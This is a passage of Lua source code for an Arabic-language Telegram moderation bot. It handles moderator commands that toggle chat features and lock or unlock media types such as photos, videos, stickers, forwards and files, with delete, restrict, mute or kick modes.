Text = ' 𖥔 تم تفعيل نسبه الانوثه'
database:del(bot_id..'Cick:ano'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الانوثه' and Manager(msg) then  
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل نسبه الانوثه'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل all' and CoSu(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل امر @all'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التاك ')
end,nil)   
elseif text == 'قفل التاك بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التاك بالطرد ')
end,nil)   
elseif text == 'فتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح التاك ')
end,nil)   
end
if text == 'قفل الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الشارحه ')
end,nil)   
elseif text == 'قفل الشارحه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الشارحه بالتقييد ')
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الشارحه بالكتم ')
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الشارحه بالطرد ')
end,nil)   
elseif text == 'فتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الشارحه ')
end,nil)   
end
if text == 'قفل الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصور ')
end,nil)   
elseif text == 'قفل الصور بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصور بالتقييد ')
end,nil)   
elseif text == 'قفل الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصور بالكتم ')
end,nil)   
elseif text == 'قفل الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصور بالطرد ')
end,nil)   
elseif text == 'فتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الصور ')
end,nil)   
end
if text == 'قفل الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الفيديو ')
end,nil)   
elseif text == 'قفل الفيديو بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الفيديو بالتقييد ')
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الفيديو بالكتم ')
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الفيديو بالطرد ')
end,nil)   
elseif text == 'فتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الفيديو ')
end,nil)   
end
if text == 'قفل المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المتحركه ')
end,nil)   
elseif text == 'قفل المتحركه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المتحركه بالتقييد ')
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المتحركه بالكتم ')
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل المتحركه بالطرد ')
end,nil)   
elseif text == 'فتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح المتحركه ')
end,nil)   
end
if text == 'قفل الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الالعاب ')
end,nil)   
elseif text == 'قفل الالعاب بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الالعاب بالتقييد ')
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الالعاب بالكتم ')
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الالعاب بالطرد ')
end,nil)   
elseif text == 'فتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الالعاب ')
end,nil)   
end
if text == 'قفل الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الاغاني ')
end,nil)   
elseif text == 'قفل الاغاني بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الاغاني بالتقييد ')
end,nil)   
elseif text == 'قفل الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الاغاني بالكتم ')
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الاغاني بالطرد ')
end,nil)   
elseif text == 'فتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الاغاني ')
end,nil)   
end
if text == 'قفل الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصوت ')
end,nil)   
elseif text == 'قفل الصوت بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصوت بالتقييد ')
end,nil)   
elseif text == 'قفل الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصوت بالكتم ')
end,nil)   
elseif text == 'قفل الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الصوت بالطرد ')
end,nil)   
elseif text == 'فتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الصوت ')
end,nil)   
end
if text == 'قفل الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكيبورد ')
end,nil)   
elseif text == 'قفل الكيبورد بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكيبورد بالتقييد ')
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكيبورد بالكتم ')  
end,nil)   
elseif text == 'قفل الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكيبورد بالطرد ')  
end,nil)   
elseif text == 'فتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الكيبورد ')  
end,nil)   
end
if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملصقات ')  
end,nil)   
elseif text == 'قفل الملصقات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملصقات بالتقييد ')  
end,nil)
elseif text == 'قفل الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملصقات بالكتم ')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملصقات بالطرد ')  
end,nil)   
elseif text == 'فتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الملصقات ')  
end,nil)   
end
if text == 'قفل التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التوجيه ')  
end,nil)   
elseif text == 'قفل التوجيه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التوجيه بالتقييد ')  
end,nil)
elseif text == 'قفل التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التوجيه بالكتم ')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل التوجيه بالطرد ')  
end,nil)   
elseif text == 'فتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح التوجيه ')  
end,nil)   
end
if text == 'قفل الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملفات ')  
end,nil)   
elseif text == 'قفل الملفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملفات بالتقييد ')  
end,nil)
elseif text == 'قفل الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
